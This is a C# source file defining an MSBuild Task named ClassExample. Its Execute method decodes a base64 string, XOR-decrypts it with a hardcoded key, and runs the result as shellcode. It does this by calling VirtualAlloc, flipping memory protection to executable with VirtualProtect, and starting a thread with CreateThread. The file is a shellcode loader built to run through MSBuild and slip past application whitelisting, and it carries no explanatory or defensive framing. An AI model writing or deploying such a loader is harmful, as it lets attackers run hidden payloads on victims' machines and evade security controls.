using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

namespace MSBuild
{
    public class ClassExample : Task, ITask
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(
                IntPtr lpAddress,
                UInt32 dwSize,
                UInt32 flNewProtect,
                out UInt32 lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds);

        static byte[] XByteArray(byte[] inputBytes, string key)
        {
            byte[] result = new byte[inputBytes.Length];
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            for (int i = 0; i < inputBytes.Length; i++)
            {
                result[i] = (byte)(inputBytes[i] ^ (byte)keyBytes[i % key.Length]);
            }
            return result;
        }

        public override bool Execute()
        {
            string b64String = "pbk0M2OyVHRLYjoz1SIGRkFOi1JTBAxpSZiJ / eXlqQRVslwPRS1BhGpLM3lNzziadYCeJx78KrlHI6cAfRw36BCrK02CNGRpBRElCYy8 / M5gyewqObdOTSo2Cux / ";
            byte[] buf = XByteArray(Convert.FromBase64String(b64String), "MyS3cr3tK3y");
            
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x1000, 0x04);
            Marshal.Copy(buf, 0, addr, size);
            UInt32 oldProtect = 0;
            VirtualProtect(addr, (uint)size, 0x20, out oldProtect);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);            
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return true;
        }
    }
}
